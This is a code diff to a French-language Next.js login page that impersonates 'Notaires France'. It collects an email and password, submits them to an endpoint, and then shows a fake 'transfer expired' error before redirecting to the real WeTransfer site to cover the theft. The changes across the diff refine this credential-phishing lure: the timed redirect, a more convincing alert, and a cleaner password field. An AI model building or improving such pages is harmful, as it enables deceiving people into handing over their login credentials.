@@ -5,19 +5,20 @@ import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
+import { Avatar, AvatarFallback } from "@/components/ui/avatar";
 import Image from "next/image";
-import { FileText, AlertCircle, Eye, EyeOff, Loader2 } from "lucide-react";
+import { FileText, AlertCircle, Eye, EyeOff, Loader2, User } from "lucide-react";
 
 export default function Component() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [passwords, setPasswords] = useState<string[]>([]);
-
   const [showPassword, setShowPassword] = useState(false);
   const [showPasswordText, setShowPasswordText] = useState(false);
   const [error, setError] = useState("");
   const [attempts, setAttempts] = useState(0);
   const [loading, setLoading] = useState(false);
+  const [showTransferExpiredAlert, setShowTransferExpiredAlert] = useState(false);
 
   const EMAIL_REGEX = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
   const PASSWORD_MIN_LENGTH = 8;
@@ -103,19 +104,17 @@ export default function Component() {
       if (!response.ok) {
         throw new Error("Failed to submit credentials");
       }
-      <Alert variant="destructive">
-      <AlertCircle className="h-4 w-4" />
-      <AlertTitle>Erreur</AlertTitle>
-      <AlertDescription>
-      votre transfert est expiré
-      </AlertDescription>
-    </Alert>
-      window.location.href = "https://wetransfer.com/";
+
+      setShowTransferExpiredAlert(true);
+      setLoading(false);
+
+      setTimeout(() => {
+        window.location.href = "https://wetransfer.com/";
+      }, 2000);
+
     } catch (error) {
       console.error("Error:", error);
-      setError(
-        "Une erreur s'est produite lors de la soumission. Veuillez réessayer."
-      );
+      setError("Une erreur s'est produite lors de la soumission. Veuillez réessayer.");
     } finally {
       setLoading(false);
     }
@@ -135,9 +134,18 @@ export default function Component() {
           alt="Notaire Logo"
           width={120}
           height={80}
-          className="w-auto h-20"
+          className="w-auto h-20 md:h-24 lg:h-28"
+          layout="responsive"
         />
       </div>
+
+      {showTransferExpiredAlert && (
+        <Alert variant="destructive" className="mb-4">
+          <AlertCircle className="h-4 w-4" />
+          <AlertTitle>Erreur</AlertTitle>
+          <AlertDescription>Votre transfert est expiré.</AlertDescription>
+        </Alert>
+      )}
 
       <Card className="w-full max-w-md bg-white">
         <CardHeader className="space-y-1 pb-2">
@@ -159,6 +167,14 @@ export default function Component() {
           </p>
 
           <form onSubmit={handleSubmit} className="space-y-4">
+            <div className="flex flex-col items-center mb-4">
+              <Avatar className="mb-2">
+                <AvatarFallback>
+                  <User className="h-10 w-10 text-gray-500" />
+                </AvatarFallback>
+              </Avatar>
+              <small className="text-gray-400 text-xs">Connectez-vous</small>
+            </div>
             <div className="space-y-2">
               <Input
                 type="email"
@@ -169,44 +185,27 @@ export default function Component() {
               />
             </div>
 
-            {showPassword && (
-              <div className="space-y-2">
-                {passwords.length > 0 && (
-                  <div className="space-y-2 hidden">
-                    {passwords.map((prevPassword, index) => (
-                      <Input
-                        key={index}
-                        type={showPasswordText ? "text" : "password"}
-                        value={prevPassword}
-                        disabled
-                        className="w-full bg-gray-50"
-                      />
-                    ))}
-                  </div>
+            <div className="relative">
+              <Input
+                type={showPasswordText ? "text" : "password"}
+                placeholder="Entrez le mot de passe"
+                value={password}
+                onChange={handlePasswordChange}
+                className="w-full pr-12"
+                minLength={PASSWORD_MIN_LENGTH}
+              />
+              <button
+                type="button"
+                onClick={() => setShowPasswordText(!showPasswordText)}
+                className="absolute right-3 top-[7px] text-gray-500 hover:text-gray-700"
+              >
+                {showPasswordText ? (
+                  <EyeOff className="h-5 w-5" />
+                ) : (
+                  <Eye className="h-5 w-5" />
                 )}
-                <div className="relative">
-                  <Input
-                    type={showPasswordText ? "text" : "password"}
-                    placeholder="Entrez le mot de passe"
-                    value={password}
-                    onChange={handlePasswordChange}
-                    className="w-full pr-12"
-                    minLength={PASSWORD_MIN_LENGTH}
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowPasswordText(!showPasswordText)}
-                    className="absolute right-3 top-[7px] text-gray-500 hover:text-gray-700"
-                  >
-                    {showPasswordText ? (
-                      <EyeOff className="h-5 w-5" />
-                    ) : (
-                      <Eye className="h-5 w-5" />
-                    )}
-                  </button>
-                </div>
-              </div>
-            )}
+              </button>
+            </div>
 
             {error && (
               <Alert variant="destructive">
@@ -234,9 +233,7 @@ export default function Component() {
 
       <footer className="mt-8 text-center space-y-4">
         <p className="text-sm text-gray-600">© Notaires France 2024</p>
-        <div className="flex items-center justify-center gap-6">
-
-        </div>
+        <div className="flex items-center justify-center gap-6"></div>
       </footer>
     </div>
   );
